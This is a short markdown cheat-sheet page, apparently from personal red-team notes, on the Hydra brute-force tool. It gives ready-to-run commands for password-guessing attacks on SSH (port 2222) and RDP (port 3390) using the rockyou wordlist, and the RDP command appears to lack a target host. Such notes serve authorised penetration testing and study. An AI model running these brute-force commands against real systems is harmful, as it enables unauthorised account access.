---
title: Hydra
parent: Tools
grand_parent: Red Team
---
# 概要

BruteForce Tool

---

# SSH

```zsh
hydra -l geisha -P /usr/share/wordlists/rockyou.txt 192.168.50.101 -s 2222
```
- **-l**: an user
- **-P**: password file
- -s: NoDefault Port

```zsh
hydra -l geisha -P /usr/share/wordlists/rockyou.txt ssh://geisha -s 2222
```
- **-l**: an user
- **-P**: password file
- -s: NoDefault Port

---

# RDP

```zsh
hydra -l geisha -P /usr/share/wordlists/rockyou.txt  -s 3390 rdp
```
- **-l**: an user
- **-P**: password file
- -s: NoDefault Port

